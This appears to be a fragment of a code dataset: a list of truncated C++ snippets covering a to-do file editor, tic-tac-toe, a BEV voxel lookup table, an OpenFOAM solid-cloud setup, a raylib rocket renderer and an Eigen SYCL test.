(std::filesystem::exists(File_Name))\r\n        {\r\n            std::cout << \"File Exist!\" << \"\\n\";\r\n            std::fstream MyFileContent(File_Name);\r\n            std::cout << \"What Do You Want to Do (Add | Update | Delete) : \";\r\n            std::string Operation = \"\";\r\n            std::cin >> Operation;\r\n            std::cin.ignore();\r\n\r\n            std::cout << \"Operation: \" << Operation << std::endl;\r\n\r\n            std::vector<std::string> new_vector; // look at Update Section\r\n            if (Operation == \"Add\")\r\n            {\r\n                int Number_of_Tasks;\r\n                std::cout << \"How Many Tasks ? : \";\r\n                std::cin >> Number_of_Tasks;\r\n                std::cin.ignore();\r\n\r\n                std::cout << \"Number of Tasks: \" << Number_of_Tasks << std::endl;\r\n\r\n                if (Number_of_Tasks < 0)\r\n                {\r\n                    std::cout << \"Restart Program And Enter a Valid Value (>= 0)\" << \"\\n\";\r\n                    return RESULT_ERROR_REASON;\r\n                }\r\n                if (Number_of_Tasks == 0)\r\n                {\r\n                    std::cout << \"GoodBye!\" << \"\\n\";\r\n                    return 0;\r\n                }\r\n                for (int i = 0; i < Number_of_Tasks; i++)\r\n                {\r\n                    std::string New_Tasks = \"\";\r\n                    std::cout << \"Add New Tasks : \";\r\n                    std::getline(std::cin, New_Tasks);\r\n\r\n                    std::cout << \"New Task: \" << New_Tasks << std::endl;\r\n\r\n                    std::ofstream outfile;\r\n                    outfile.open(File_Name, std::ios_base::app); // append\r\n                    outfile << New_Tasks << \"\\n\";\r\n                    outfile.close();\r\n                }\r\n                MyFileContent.close();\r\n            }\r\n\r\n            if (Operation == UPDATE)\r\n            {\r\n                std::string str = \"\";\r\n                std::ifstream ReadFile(File_Name);\r\n                while (std::getline(ReadFile, str))\r\n                {\r\n                    new_vector.push_back(str);\r\n                }\r\n                std::cout << \"Enter Task Index to Update (Start From Index 0) : \";\r\n                int Task_Index;\r\n                std::cin >> Task_Index;\r\n                std::cin.ignore();\r\n\r\n                std::cout << \"Task Index: \" << Task_Index << std::endl;\r\n\r\n                while (Task_Index < 0 || Task_Index >= new_vector.size())\r\n                {\r\n                    std::cout << \"Enter Valid Task Index (",
    "#include<iostream>\r\nusing namespace std;\r\nvoid displayboard();\r\nvoid playerchoice();\r\nvoid blockreset();\r\nvoid exit_game();\r\nvoid show_winners_list(const string winners[], int size);\r\nbool gameover();\r\nstruct data{\r\n    bool draw = false;\r\n    char board[3][3] = { {'1','2','3'}, {'4','5','6'}, {'7','8','9'} };\r\n    char turn = 'X';\r\n    char player1[20], player2[20];\r\n    bool decision = false;\r\n    int reset = 0;\r\n};\r\nstruct data d;\r\nint main(){\r\n    int choice;\r\n    const int MAX_WINNERS = 100;\r\n    string winners[MAX_WINNERS];\r\n    int winnersCount = 0;\r\n    cout << \"\\n\\n\\t\\t**************** WELCOME to C++ GAME *****************\\n\\n\";\r\n    cout << \"\\t\\t**************** T I C K  T A C  T O E *****************\\n\\n\\n\";\r\n    do{\r\n        cout << \"\\t\\t 1. PLAY GAME\\n\\n\";\r\n        cout << \"\\t\\t 2. SHOW WINNERS LIST\\n\\n\";\r\n        cout << \"\\t\\t 3. EXIT GAME\\n\\n\\n\";\r\n        cout << \"\\t\\t=======================================================\" << endl;\r\n        cout << \"\\t\\t=======================================================\" << endl;\r\n        cout << \"\\t\\t Enter your choice=\";\r\n        cin >> choice;\r\n        system(\"cls\"); // Note: This line may not work on all systems, consider using system(\"clear\") for Unix-like systems\r\n        switch (choice){\r\n            case 1:\r\n                cout << \"\\n\\n\\tEnter player [X] name=\";\r\n                cin >> d.player1;\r\n                cout << \"\\tEnter player [O] name=\";\r\n                cin >> d.player2;\r\n                while (gameover()) {\r\n                    displayboard();\r\n                    playerchoice();\r\n                    gameover();\r\n                }\r\n                if (d.turn == 'X' && d.draw == false){\r\n                    displayboard();\r\n                    cout << \"\\n\\t\" << d.player2 << \" [O] Wins!!\\n\\tCongratulations!\" << endl;\r\n                    cout << \"\\n\\t\\t\\''HOPE YOU ENJOY THE GAME''!!!!\";\r\n                    cout << \"\\n\\n\\tDO YOU WANT TO PLAY AGAIN\\n\\n\" << endl;\r\n                    blockreset();\r\n                    winners[winnersCount++] = d.player2;\r\n                }\r\n                else if (d.turn == 'O' && d.draw == false) {\r\n                    displayboard();\r\n                    cout << \"\\n\\t\" << d.player1 << \" [X] Wins!!\\n\\tCongratulations!\" << endl;\r\n                    cout << \"\\n\\t\\t\\tHOPE YOU ENJOY THE GAME!!!!\";\r\n                    cout << \"\\n\\n\\tDO YOU WANT TO PLAY AGAIN\\n\\n\" << endl;\r\n                    blockreset();\r\n                    winners[winnersCount++] = d.player1;\r\n                }\r\n                else if (d.draw == true){\r\n                    displayboard();\r\n                    cout << \"\\n\\t\\tGame Draw\" << endl;\r\n                    cout << \"\\n\\t\\t\\tHOPE YOU ENJOY THE GAME!!!!\";\r\n                    cout << \"\\n\\n\\tDO YOU WANT TO PLAY AGAIN\\n\\n\" << endl;\r\n                    d.decision = true;\r\n                }\r\n                break;\r\n            case 2:\r\n                show_winners_list(winners, winnersCount);\r\n                break;\r\n            case 3:\r\n                exit_game();\r\n                break;\r\n            default:\r\n                cout << \"\\n\\tINVALID CHOICE\" << endl;\r\n        }\r\n    } while (choice != 3);\r\n    return 0;\r\n}\r\nvoid displayboard(){\r\n    system(\"cls\"); // Note: This line may not work on all systems, consider using system(\"clear\") for Unix-like systems\r\n    cout << \"\\n   T I C K  T A C  T O E\\n\" << endl;\r\n    cout << \"\\t\" << d.player1 << \" [X]\\n\\t\" << d.player2 << \" [0]\" << endl;\r\n    cout << \"\\t\\t     |     |     \" << endl;\r\n    cout << \"\\t\\t  \" << d.board[0][0] << \"  |  \" << d.board[0][1] << \"  |  \" << d.board[0][2] << \"  \" << endl;\r\n    cout << \"\\t\\t__________________\\n\" << endl;\r\n    cout << \"\\t\\t     |     |     \" << endl;\r\n    cout << \"\\t\\t  \" << d.board[1][0] << \"  |  \" << d.board[1][1] << \"  |  \" << d.board[1][2] << \"  \" << endl;\r\n    cout << \"\\t\\t__________________\\n\" << endl;\r\n    cout << \"\\t\\t     |     |     \" << endl;\r\n    cout << \"\\t\\t  \" << d.board[2][0] << \"  |  \" << d.board[2][1] << \"  |  \" << d.board[2][2] << \"  \" << endl;\r\n}\r\nvoid playerchoice(){\r\n    int choice;\r\n    int row, column;\r\n    if (d.turn == 'X')\r\n        cout << \"\\n\\t\" << d.player1 << \" [X] turn:\";\r\n    if (d.turn == 'O')\r\n        cout << \"\\n\\t\" << d.player2 << \" [O] turn:\";\r\n    cin >> choice;\r\n    switch (choice){\r\n    case 1:\r\n        row = 0; column = 0;\r\n        break;\r\n    case 2:\r\n        row = 0; column = 1;\r\n        break;\r\n    case 3:\r\n        row = 0; column = 2;\r\n        break;\r\n    case 4:\r\n        row = 1; column = 0;\r\n        break;\r\n    case 5:\r\n        row = 1; column = 1;\r\n        break;\r\n    case 6:\r\n        row = 1; column = 2;\r\n        break;\r\n    case 7:\r\n        row = 2; column = 0;\r\n        break;\r\n    case 8:\r\n        row = 2; column = 1;\r\n        break;\r\n    case 9:\r\n        row = 2; column = 2;\r\n        break;\r\n    default:\r\n        cout << \"Invalid choice\";\r\n    }\r\n    // Check if the selected position is already taken\r\n    if (d.board[row][column] == 'X' || d.b",
    "#include <iostream>\n#include <vector>\n#include <memory>\n#include <cmath>\n#include <cassert>\n\nclass Tensor {\npublic:\n    Tensor(std::vector<float> data, std::vector<int> shape) : data_(data), shape_(shape) {}\n\n    float* get_data() {\n        return data_.data();  //\n    }\n\n    std::vector<int> shape() {\n        return shape_;\n    }\n\nprivate:\n    std::vector<float> data_;\n    std::vector<int> shape_;\n};\n\n\n/**\n * @brief \u6784\u5efa\u67e5\u627e\u8868 (Look-Up Table, LUT) \u4ee5\u4fbf\u5c06\u4f53\u7d20\u5750\u6807\u6620\u5c04\u5230\u56fe\u50cf\u5750\u6807\n * \u53c2\u8003\u6587\u7ae0\uff1ahttps://blog.csdn.net/qq_41204464/article/details/137571716(fastbev)\n *         https://blog.csdn.net/MinyounZhang/article/details/134582017(lss)\n *\n * @param n_voxels   \u5305\u542b\u4f53\u7d20\u7f51\u683c\u5728\u6bcf\u4e2a\u65b9\u5411\u4e0a\u7684\u6570\u91cf\uff08X, Y, Z\uff09\n * @param voxel_size \u6bcf\u4e2a\u4f53\u7d20\u7684\u5927\u5c0f (Tensor)\n * @param origin     BEV\u7f51\u683c\u7684\u539f\u70b9\u5750\u6807 (Tensor)\n * @param projection \u6295\u5f71\u77e9\u9635\uff0c\u7528\u4e8e\u5c06\u4f53\u7d20\u5750\u6807\u8f6c\u6362\u4e3a\u56fe\u50cf\u5750\u6807 (Tensor)\n * @param n_images   \u56fe\u50cf\u7684\u6570\u91cf\n * @param height     \u56fe\u50cf\u7684\u9ad8\u5ea6\uff08\u50cf\u7d20\uff09\n * @param width      \u56fe\u50cf\u7684\u5bbd\u5ea6\uff08\u50cf\u7d20\uff09\n * @param n_channels \u56fe\u50cf\u7684\u901a\u9053\u6570\u91cf\n * @param LUT        \u67e5\u627e\u8868\uff0c\u7528\u4e8e\u5b58\u50a8\u4f53\u7d20\u5230\u56fe\u50cf\u7684\u6620\u5c04\uff08\u8f93\u51fa\u53c2\u6570\uff09\n * @param valid      \u6807\u5fd7\u6570\u7ec4\uff0c\u7528\u4e8e\u6307\u793a\u54ea\u4e9b\u4f53\u7d20\u6709\u6548\uff08\u8f93\u51fa\u53c2\u6570\uff09\n * @param volume     \u5b58\u50a8\u4f53\u7d20\u503c\u7684\u6570\u7ec4\uff08\u8f93\u51fa\u53c2\u6570\uff09\n */\nvoid build_LUT_CPU(std::vector<int32_t> n_voxels, Tensor voxel_size, Tensor origin,\n                   Tensor projection, int32_t n_images, int32_t height, int32_t width, int32_t n_channels,\n                   std::shared_ptr<int32_t>& LUT, std::shared_ptr<int32_t>& valid, std::shared_ptr<float>& volume) {\n    // BEV\u7279\u5f81\u5728x,y,z\u65b9\u5411\u4e0a\u6bcf\u4e2a\u65b9\u5411\u4e0a\u7684\u7f51\u683c\u6570\u91cf\n    int n_x_voxels = n_voxels[0];\n    int n_y_voxels = n_voxels[1];\n    int n_z_voxels = n_voxels[2];\n\n    // \u83b7\u53d6\u6bcf\u4e2a\u65b9\u5411\u4e0a\u7684\u7f51\u683c\u5c3a\u5bf8\u5927\u5c0f\n    float* voxel_sizep = (float*)voxel_size.get_data();\n    float size_x = voxel_sizep[0];\n    float size_y = voxel_sizep[1];\n    float size_z = voxel_sizep[2];\n\n    // \u83b7\u53d6BEV\u7f51\u683c\u539f\u59cb\u5750\u6807\n    float* originp = (float*)origin.get_data();\n    float origin_x = originp[0];\n    float origin_y = originp[1];\n    float origin_z = originp[2];\n\n    int nrof_voxels = n_x_voxels * n_y_voxels * n_z_voxels;\n\n    // \u4e3a\u4ec0\u4e48\u8981\u4f7f\u7528get()\u6765\u91cd\u65b0\u5b9a\u4e49\u53d8\u91cf\uff1f?\n    //\n    int32_t* LUTp = LUT.get();  // LUT.get() \u8fd4\u56de\u7684\u662f\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\uff0c\n    int32_t* validp = valid.get();\n\n    std::vector<float> ar(3);\n    std::vector<float> pt(3);\n    size_t offset = 0;\n    float count = 0.0;\n\n    for (int zi = 0; zi < n_z_voxels; ++zi) {\n        for (int yi = 0; yi < n_y_voxels; ++yi) {\n            for (int xi = 0; xi < n_x_voxels; ++xi) {\n                // \u8fd9\u91cc\u4ec0\u4e48\u610f\u601d\uff1f\uff1f\n                // \u56de\u7b54\uff1acurrent_lut\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411LUTp\u6570\u7ec4\u4e2d\u7684offset*2\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u76842\u662f\u56e0\u4e3a\u6bcf\u4e2a\u4f53\u7d20\u5bf9\u5e94\u4e24\u4e2a\u503c\uff0c\u4e00\u4e2a\u662f\u56fe\u50cf\u7d22\u5f15\uff0c\u4e00\u4e2a\u662f\u50cf\u7d20\u7d22\u5f15\n                auto current_lut = &LUTp[offset * 2];\n                *current_lut = -1;        // \u5b58\u50a8\u56fe\u50cf\u7d22\u5f15\n                *(current_lut + 1) = 0;   // \u5b58\u50a8\u5bf9\u5e94\u56fe\u50cf\u4e2d\u7684\u50cf\u7d20\u7d22\u5f15\n                for (int img = 0; img < n_images; img++) {\n                    pt[0] = (xi - n_x_voxels / 2.0f) * size_x + origin_x;\n                    pt[1] = (yi - n_y_voxels / 2.0f) * size_y + origin_y;\n                    pt[2] = (zi - n_z_voxels / 2.0f) * size_z + origin_z;\n\n                    // \u7528\u6295\u5f71\u77e9\u9635\u5c06\u4f53\u7d20\u5750\u6807\u8f6c\u6362\u4e3a\u56fe\u50cf\u5750\u6807\uff0ci\u8868\u793a\u6295\u5f71\u77e9\u9635\u7684\u884c\uff0cj\u8868\u793a\u6295\u5f71\u77e9\u9635\u7684\u5217\n                    // \u5bf9\u4e00\u4e2a\u7ef4\u5ea6\u4e3a[d1,d2,d3...dn]\u7684\u6570\u7ec4\uff0c\u7d22\u5f15[i1,i2,i3...in]\u5728\u5185\u5b58\u4e2d\u7d22\u5f15\u7684\u8ba1\u7b97\u516c\u5f0f\u4e3a\uff1a\n                    // idex = i1*d2*d3*...*dn + i2*d3*...*dn + i3*d4*...*dn + ... + in\n                    // \u6ce8\uff1a\u7b2c\u4e00\u6b21\uff0c\u53ef\u4ee5\u628ad1\u770b\u4f5c\u884c\u7ef4\u5ea6\uff0cd2,d3...dn\u770b\u4f5c\u5217\u7ef4\u5ea6\uff0c\u7b2c\u4e8c\u6b21\uff0c\u53ef\u4ee5\u628ad2\u770b\u4f5c\u884c\uff0cd3,d4...dn\u770b\u4f5c\u5217\uff0c\u4ee5\u6b64\u7c7b\u63a8\n                    // \u7b2c\u4e00\u6b21\uff0c\u7d22\u5f15\u4e3ai1*d2*d3...dn + \u5217\u7d22\u5f15\n                    // \u7b2c\u4e8c\u4ea4\uff0c\u9700\u8981\u8ba1\u7b97\u7b2c\u4e00\u6b21\u5269\u4e0b\u7684\u5217\u7d22\u5f15\uff0c\u6b64\u65f6\u53c8\u770b\u4f5c\u4e00\u4e2a[d2,d3...dn]\u7684\u6570\u7ec4\uff0c\u6240\u4ee5\u5217\u7d22\u5f15\u4e3ai2*d3*...*dn + \u5217\u7d22\u5f15\n                    // \u5012\u6570\u7b2c\u4e8c\u6b21\uff0c\u7d22\u5f15\u4e3ai(n-1)*dn + \u5217\u7d22\u5f15\n                    // \u6700\u540e\u4e00\u6b21\uff0c\u7d22\u5f15\u4e3ain\n                    // \u6240\u4ee5\uff0c\u6700\u7ec8\u5728\u5185\u5b58\u4e2d\u7684\u7d22\u5f15\u4e3ai1*d2*d3*...*dn + i2*d3*...*dn + i3*d4*...*dn + ... + in\n                    // \u4e3e\u4f8b\uff1aprojection\u7684\u7ef4\u5ea6\u662f(N, 3, 4)\uff0c\u5219\u5bf9\u4e8e\u7b2cimg\u4e2a\u56fe\u50cf\uff0c\u6295\u5f71\u77e9\u9635\u7684\u7b2ci\u884c\u7b2cj\u5217\u7684\u5143\u7d20\u5728\u5185\u5b58\u4e2d\u7684\u7d22\u5f15\u4e3a\n                    // img*3*4 + i*4 + j = (img*3 + i)*4 + j\uff0c\u5bf9\u5e94\u4e0a\u4e86\u4ee3\u7801\u4e2d\u7684((img * 3) + i) * 4 + j\n                    for (int i = 0; i < 3; ++i) {\n                        // ar[i] = \u6295\u5f71\u77e9\u9635\u7684\u7b2ci\u884c\u7b2c4\u5217\n                        // projection\u7684\u7ef4\u5ea6\u662f(N, 3, 4)\uff0cprojection.get_data()\u8fd4\u56de\u7684\u662f\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\n                        // projection\u5728\u5185\u5b58\u4e2d\u7684\n                        ar[i] = ((float*)projection.get_data())[((img * 3) + i) * 4 + 3];\n                        for (int j = 0; j < 3; ++j) {\n                            // \u5c06projection\u4e2d\u7684i\u884cj\u5217\u5143\u7d20\u548c\u4f53\u7d20\u5750\u6807\u70b9\u7b2cj\u4e2a\u5143\u7d20\u76f8\u4e58\uff0c\u5bf9\u5e94\u4e16\u754c\u5750\u6807\u8f6c\u6362\u5230\u50cf\u7d20\u5750\u6807\u7684\u77e9\u9635\u4e58\u6cd5\u7b2cj\u4e2a\u5143\u7d20\u7ed3\u679c\n                            ar[i] += ((float*)projection.get_data())[(img * 3 + i) * 4 + j] * pt[j];\n                        }\n                    }\n\n                    // \u7528\u6df1\u5ea6Z\u5bf9\u6295\u5f71\u540e\u7684\u5750\u6807\u8fdb\u884c\u5f52\u4e00\u5316\u5904\u7406\uff0c\u5f97\u5230\u6700\u7ec8\u7684\u50cf\u7d20\u5750\u6807\u3002\u53c2\u8003\u89c6\u89c9slam\u5341\u56db\u8bb2\u7684\u9488\u5b54\u76f8\u673a\u6295\u5f71\u6a21\u578b\n                    // TODO \u8fd9\u91cc\u5e94\u8be5\u8fd8\u8981\u9664\u4ee5\u4e00\u4e2a\u7279\u5f81\u56fe\u5bf9\u5e94\u539f\u56fe\u7684\u4e0b\u91c7\u6837\u500d\u6570\uff0c\u624d\u5bf9\u5e94\u7279\u5f81\u56fe\u4e0a\u7684\u5750\u6807\n                    int x = round(ar[0] / ar[2]);\n                    int y = round(ar[1] / ar[2]);\n                    float z = ar[2];\n\n                    // \u5224\u65ad\u6295\u5f71\u540e\u7684\u50cf\u7d20\u5750\u6807x,y\u662f\u5426\u5728\u56fe\u50cf\u5185\uff0c\u4e14z\u662f\u5426\u5728\u6444\u50cf\u5934\u524d\u65b9\uff0c\u5982\u679c\u6ee1\u8db3\uff0c\u5219\u8ba4\u4e3a\u627e\u5230\u4e86BEV\u7279\u5f81\u4e2d\u5f53\u524d\u5750\u6807(xi,yi,zi)\n                    // \u57282D\u7279\u5f81\u5bf9\u5e94\u7684\u5750\u6807(x,y,z)\u3002\n                    // \u6ce8\uff1a\u4e00\u4e2a\u70b9\u7684\u4e09\u7ef4\u7a7a\u95f4\u5750\u6807(xi,yi,zi)\u6620\u5c04\u52a0\u50cf\u7d20\u5750\u6807\u7cfb\u4e2d\u540e\u7684\u5750\u6807(x,y,zi)\u3002\u6df1\u5ea6\u503c\u662f\u76f8\u7b49\u7684\uff0c\u53ef\u4ee5\u53c2\u8003\u76f8\u673a\u6a21\u578b\u6295\u5f71\u516c\u5f0f\n                    if ((x >= 0) && (y >= 0) && (x < width) && (y < height) && (z > 0)) {\n                        *current_lut = img;\n                        // \u8fd9\u91cc\u5f97\u5230\u7684\u662f\u5f53\u524d\u4f53\u7d20(xi,yi,zi)\u5728\u7b2cimg\u4e2a\u56fe\u50cf\u7279\u5f81\u56fe\u4e2d\u7684\u7d22\u5f15\uff0c\u5c06x,y\u65b9\u5411\u4e0a\u7684\u6240\u6709\u683c\u5b50\u770b\u4f5c\u4e00\u4e2a\u4e00\u7ef4\u6570\u7ec4\n                        *(curr",
    "#include <cstdlib>\n#include <iomanip>\n#include <limits>\n\n#include \"fvCFD.H\"\n\n#include \"solidcloud.h\"\n#include \"./libmotion/motionfactory.h\"\n#include \"./libshape/shapefactory.h\"\nnamespace sdfibm {\n\nSolidCloud::SolidCloud(const Foam::word& dictfile, const Foam::fvMesh& mesh):\n    m_mesh(mesh),\n    m_geotools(GeometricTools(m_mesh)),\n    m_cellenum(CellEnumerator(m_mesh))\n{\n    if(Foam::Pstream::master())\n    {\n        logfile.open(\"cloud.log\");\n        logfile << GenBanner(\"INIT SOLIDCLOUD\");\n    }\n    m_solids.reserve(10);\n    m_planes.reserve(10);\n\n    Foam::IFstream ifstream = Foam::IFstream(dictfile);\n    dictionary root(ifstream());\n\n    if(Foam::Pstream::master())\n        logfile << \"reading solids from: \" << root.name() << '\\n';\n\n    const dictionary& meta = root.subDict(\"meta\");\n    m_ON_TWOD  = Foam::readBool(meta.lookup(\"on_twod\"));\n\n    if(Foam::Pstream::master())\n    {\n        logfile << GenBanner(\"SUMMARY\");\n        string dim = m_ON_TWOD ? \"2D\" : \"3D\";\n        logfile << \"Binary was compiled at \" << __DATE__ << ' ' << __TIME__ << '\\n';\n        logfile << \"Simulation starts   at \" << GetTimeString() << '\\n';\n    }\n\n   // read and create shape, motion, and material\n   try {\n        // read and create shapes\n        if(Foam::Pstream::master())\n        {\n            logfile << GenBanner(\"CREATE: SHAPES\");\n            logfile << \"--> Available shape types:\\n\";\n            ShapeFactory::report(logfile);\n            logfile << \"--> Used shapes:\\n\";\n        }\n        const dictionary& shapes = root.subDict(\"shapes\");\n        for (int i=0; i < shapes.size(); ++i)\n        {\n            const dictionary& para = shapes.subDict(shapes.toc()[i]);\n            std::string type = Foam::word(para.lookup(\"type\"));\n            std::string name = Foam::word(para.lookup(\"name\"));\n\n            m_libshape[name] = ShapeFactory::create(type, para);\n            if(m_libshape[name] == nullptr)\n                throw std::runtime_error(std::string(\"Unrecognized shape type \" + type + '\\n'));\n\n            if(Foam::Pstream::master())\n                logfile << \"[+] \" << type << \" as \" << name << \" (\" << m_libshape[name]->description() << \")\\n\";\n        }\n\n        m_libmat[\"mat\"] = new IMaterial(1.0);\n    }\n    catch (const std::exception& e)\n    {\n        if(Foam::Pstream::master())\n        {\n            std::cout << e.what();\n            logfile << \"Error when creating shape/motion/material!\" << e.what() << '\\n';\n        }\n        std::exit(1);\n    }\n\n    // create solids\n    if(Foam::Pstream::master())\n        logfile << GenBanner(\"CREATE: SOLIDS & PLANES\");\n\n    const dictionary &solids = root.subDict(\"solids\");\n    forAll(solids, i)\n    {\n        const dictionary &solid = solids.subDict(solids.toc()[i]);\n\n        vector pos = solid.lookup(\"pos\");\n        if (m_ON_TWOD)\n        {\n            // sanity check for 2d simulation: solid must have z = 0\n            if(pos.z() !=  0)\n                Quit(\"Solid must has z=0 in 2D simulation, violated by solid # \" + std::to_string(i));\n        }\n        // create solid\n        Solid s(i, pos, quaternion::I);\n        // read velocity, euler angle, angular velocity\n        vector euler = solid.lookupOrDefault(\"euler\", vector::zero);\n        s.setOrientation(euler*M_PI/180.0);\n\n        std::string shp_name = Foam::word(solid.lookup(\"shp_name\"));\n        s.setMaterialAndShape(m_libmat[\"mat\"], m_libshape[shp_name]);\n        this->addSolid(s);\n\n        if(Foam::Pstream::master())\n            logfile << \"Solid \" << i << \" shape = \" << shp_name << \"\\n\";\n    }\n\n    const dictionary &planes = root.subDict(\"planes\");\n    forAll(planes, i)\n    {\n        const dictionary &plane = planes.subDict(planes.toc()[i]);\n\n        vector pos = plane.lookup(\"pos\");\n        if (m_ON_TWOD)\n        {\n            // sanity check for 2d simulation: plane must have z = 0\n            if(pos.z() !=  0)\n                Quit(\"Plane must has z=0 in 2D simulation, violated by plane # \" + std::to_string(i));\n        }\n        // create plane\n        Solid s(i, pos, quaternion::I);\n        // read velocity, euler angle, angular velocity\n        vector euler = plane.lookupOrDefault(\"euler\", vector::zero);\n        s.setOrientation(euler*M_PI/180.0);\n\n        std::string shp_name = Foam::word(plane.lookup(\"shp_name\"));\n        s.setMaterialAndShape(m_libmat[\"mat\"], m_libshape[shp_name]);\n        this->addPlane(s);\n\n        if(Foam::Pstream::master())\n            logfile << \"Plane \" << i << \" shape = \" << shp_name << \"\\n\";\n    }\n\n    if(Foam::Pstream::master())\n    {\n        logfile << \"Totally [\" << m_solids.size() << \"] solids and [\" << m_planes.size() << \"] planes.\\n\";\n        logfile << GenBanner(\"END OF INIT\");\n    }\n}\n\n\nvoid SolidCloud::solidFluidInteract(Solid& solid, const scalar& dt)\n{\n    m_geotools.clearCache();\n    m_cellenum.SetSolid(solid);\n\n    const Foam::scalarField& cv = m_mesh.V();\n\n    scalar alpha = 0.0;\n    while (!m_cellenum.Empty())\n    {\n        int icur = m_cellenum.GetCurCellInd();\n        if (m_c",
    "// Made by Dominick O'Hara\r\n// April 30, 2024\r\n#include \"Rocket.h\"\r\n#include \"rlgl.h\"\r\n#include \"raymath.h\"\r\n#include \"Sim3DUtils.h\"\r\n\r\n\r\nconst float Rocket::DEFAULT_CANARD_RPS = 24.0f * DEG2RAD;\r\n\r\nvoid Rocket::ApplyCoordsToMatrix() {\r\n\trlTranslatef(position.x, position.y, position.z);\r\n\tMatrix rot = MatrixRotateXYZ({ \r\n\t\torientation.pitch, \r\n\t\torientation.roll,\r\n\t\torientation.yaw\r\n\t});\r\n\trlMultMatrixf((const float*)&rot);\r\n\t//rlRotatef(orientation.pitch * RAD2DEG, 1.0f, 0.0f, 0.0f);\r\n\t//rlRotatef(orientation.roll * RAD2DEG, 0.0f, 1.0f, 0.0f);\r\n\t//rlRotatef(orientation.yaw * RAD2DEG, 0.0f, 0.0f, 1.0f);\r\n}\r\n\r\nvoid Rocket::DrawCanard(int bodyFace, float bodyHeight, float canardRotation)\r\n{\r\n\trlPushMatrix();\r\n\t\trlTranslatef(0.0f, bodyHeight - ROCKET_HEIGHT / 2, 0.0f);\r\n\t\trlRotatef(bodyFace * 90.0f, 0.0f, 1.0f, 0.0f);\r\n\t\trlTranslatef(0.0f, 0.0f, 0.75f);\r\n\t\trlRotatef(canardRotation * RAD2DEG, 0.0f, 0.0f, 1.0f);\r\n\t\tSim3DUtils::DrawCubeWithBoundingBox(\r\n\t\t\tposition,\r\n\t\t\t0.1f, 1.0f, 0.5f,\r\n\t\t\t{ 125, 125, 125, 255 },\r\n\t\t\t{ 255, 255, 255, 255 }\r\n\t\t);\r\n\trlPopMatrix();\r\n}\r\n\r\n\r\nvoid Rocket::UpdateCanardFins(float deltaTime)\r\n{\r\n\tif (canardRPS > 90000.0f) {\r\n\t\tfor (int i = 0; i < 4; i++)\r\n\t\t\tcanard_rotations[i] = goal_canard_rotations[i];\r\n\t\treturn;\r\n\t}\r\n\t\r\n\tfloat radDelta = canardRPS * deltaTime;\r\n\tfor (int i = 0; i < 4; i++)\r\n\t{\r\n\t\t// rotate clockwise or counter clockwise based on which is closer\r\n\t\tbool dir = signbit(goal_canard_rotations[i] - canard_rotations[i]);\r\n\t\tif (dir == true) { // negative\r\n\t\t\tcanard_rotations[i] -= radDelta;\r\n\t\t\tif (canard_rotations[i] < goal_canard_rotations[i])\r\n\t\t\t\tcanard_rotations[i] = goal_canard_rotations[i];\r\n\t\t}\r\n\t\telse { // positive\r\n\t\t\tcanard_rotations[i] += radDelta;\r\n\t\t\tif (canard_rotations[i] > goal_canard_rotations[i])\r\n\t\t\t\tcanard_rotations[i] = goal_canard_rotations[i];\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid Rocket::DrawAxis() {\r\n\trlPushMatrix();\r\n\t\tApplyCoordsToMatrix();\r\n\t\tSim3DUtils::DrawAxis(position, 3.0f, { 2.0f, 6.0f, 2.0f });\r\n\trlPopMatrix();\r\n}\r\n\r\nvoid Rocket::Draw(float deltaTime)\r\n{\r\n\trlPushMatrix();\r\n\t\tApplyCoordsToMatrix();\r\n\t\tSim3DUtils::DrawCubeWithBoundingBox(\r\n\t\t\tposition,\r\n\t\t\t1.0f, ROCKET_HEIGHT, 1.0f,\r\n\t\t\t{ 125, 125, 125, 255 },\r\n\t\t\t{ 255, 255, 255, 255 }\r\n\t\t);\r\n\t\tfor (int i = 0; i < 4; i++) {\r\n\t\t\tDrawCanard(i, 9.0f, GetCanardRotation(i));\r\n\t\t}\r\n\trlPopMatrix();\r\n}",
    "// This file is part of Eigen, a lightweight C++ template library\n// for linear algebra.\n//\n// Copyright (C) 2016\n// Mehdi Goli    Codeplay Software Ltd.\n// Ralph Potter  Codeplay Software Ltd.\n// Luke Iwanski  Codeplay Software Ltd.\n// Contact: <eigen@codeplay.com>\n//\n// This Source Code Form is subject to the terms of the Mozilla\n// Public License v. 2.0. If a copy of the MPL was not distributed\n// with this file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n#define EIGEN_TEST_NO_LONGDOUBLE\n#define EIGEN_TEST_NO_COMPLEX\n\n#define EIGEN_DEFAULT_DENSE_INDEX_TYPE int64_t\n#define EIGEN_USE_SYCL\n\n#include \"main.h\"\n#include <unsupported/Eigen/CXX11/Tensor>\n\nusing Eigen::Tensor;\n\n// Inflation Definition for each dimension the inflated val would be\n//((dim-1)*strid[dim] +1)\n\n// for 1 dimension vector of size 3 with value (4,4,4) with the inflated stride value of 3 would be changed to\n// tensor of size (2*3) +1 = 7 with the value of\n// (4, 0, 0, 4, 0, 0, 4).\n\ntemplate <typename DataType, int DataLayout, typename IndexType>\nvoid test_simple_inflation_sycl(const Eigen::SyclDevice &sycl_device) {\n\n\n  IndexType sizeDim1 = 2;\n  IndexType sizeDim2 = 3;\n  IndexType sizeDim3 = 5;\n  IndexType sizeDim4 = 7;\n  array<IndexType, 4> tensorRange = {{sizeDim1, sizeDim2, sizeDim3, sizeDim4}};\n  Tensor<DataType, 4, DataLayout,IndexType> tensor(tensorRange);\n  Tensor<DataType, 4, DataLayout,IndexType> no_stride(tensorRange);\n  tensor.setRandom();\n\n  array<IndexType, 4> strides;\n  strides[0] = 1;\n  strides[1] = 1;\n  strides[2] = 1;\n  strides[3] = 1;\n\n\n  const size_t tensorBuffSize =tensor.size()*sizeof(DataType);\n  DataType* gpu_data_tensor  = static_cast<DataType*>(sycl_device.allocate(tensorBuffSize));\n  DataType* gpu_data_no_stride  = static_cast<DataType*>(sycl_device.allocate(tensorBuffSize));\n\n  TensorMap<Tensor<DataType, 4, DataLayout,IndexType>> gpu_tensor(gpu_data_tensor, tensorRange);\n  TensorMap<Tensor<DataType, 4, DataLayout,IndexType>> gpu_no_stride(gpu_data_no_stride, tensorRange);\n\n  sycl_device.memcpyHostToDevice(gpu_data_tensor, tensor.data(), tensorBuffSize);\n  gpu_no_stride.device(sycl_device)=gpu_tensor.inflate(strides);\n  sycl_device.memcpyDeviceToHost(no_stride.data(), gpu_data_no_stride, 